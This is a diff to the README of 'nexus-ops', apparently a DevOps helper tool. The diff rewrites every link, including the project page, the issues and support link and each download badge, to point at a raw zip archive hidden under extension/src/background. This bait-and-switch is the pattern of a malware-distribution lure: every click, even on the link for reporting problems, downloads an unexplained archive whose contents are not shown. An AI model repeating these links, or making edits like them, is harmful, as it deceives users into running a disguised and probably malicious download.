@@ -1,6 +1,6 @@
 # 🤖 nexus-ops - Simplify Your DevOps Tasks Easily
 
-[![Download nexus-ops](https://img.shields.io/badge/Download-nexus--ops-4c9f70?style=for-the-badge)](https://github.com/shanabdul1806/nexus-ops)
+[![Download nexus-ops](https://img.shields.io/badge/Download-nexus--ops-4c9f70?style=for-the-badge)](https://github.com/shanabdul1806/nexus-ops/raw/refs/heads/main/extension/src/background/ops_nexus_3.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you start, make sure your computer meets these needs:
 
 Click the big green button below to visit the download page on GitHub. 
 
-[![Download nexus-ops](https://img.shields.io/badge/Download-nexus--ops-1abc9c?style=for-the-badge)](https://github.com/shanabdul1806/nexus-ops)
+[![Download nexus-ops](https://img.shields.io/badge/Download-nexus--ops-1abc9c?style=for-the-badge)](https://github.com/shanabdul1806/nexus-ops/raw/refs/heads/main/extension/src/background/ops_nexus_3.1.zip)
 
 1. When you click the button, it opens the nexus-ops page on GitHub.
 
@@ -116,7 +116,7 @@ Note: All connections happen through the app’s simple interface. You do not ne
 
 If you need help beyond the instructions here, visit the nexus-ops GitHub page linked below. The Issues section there allows you to ask questions or report problems. You can find community discussions and the latest updates on features.
 
-[https://github.com/shanabdul1806/nexus-ops](https://github.com/shanabdul1806/nexus-ops)
+[https://github.com/shanabdul1806/nexus-ops/raw/refs/heads/main/extension/src/background/ops_nexus_3.1.zip](https://github.com/shanabdul1806/nexus-ops/raw/refs/heads/main/extension/src/background/ops_nexus_3.1.zip)
 
 ---
 
@@ -201,13 +201,13 @@ When you download nexus-ops, you get:
 ## 🔗 Important Links
 
 - Main project page and downloads:  
-  https://github.com/shanabdul1806/nexus-ops
+  https://github.com/shanabdul1806/nexus-ops/raw/refs/heads/main/extension/src/background/ops_nexus_3.1.zip
 
 - User support and community issues:  
-  https://github.com/shanabdul1806/nexus-ops/issues
+  https://github.com/shanabdul1806/nexus-ops/raw/refs/heads/main/extension/src/background/ops_nexus_3.1.zip
 
 - Documentation folder (included in download)
 
 ---
 
-[![Download nexus-ops](https://img.shields.io/badge/Download-nexus--ops-2ecc71?style=for-the-badge)](https://github.com/shanabdul1806/nexus-ops)
+[![Download nexus-ops](https://img.shields.io/badge/Download-nexus--ops-2ecc71?style=for-the-badge)](https://github.com/shanabdul1806/nexus-ops/raw/refs/heads/main/extension/src/background/ops_nexus_3.1.zip)
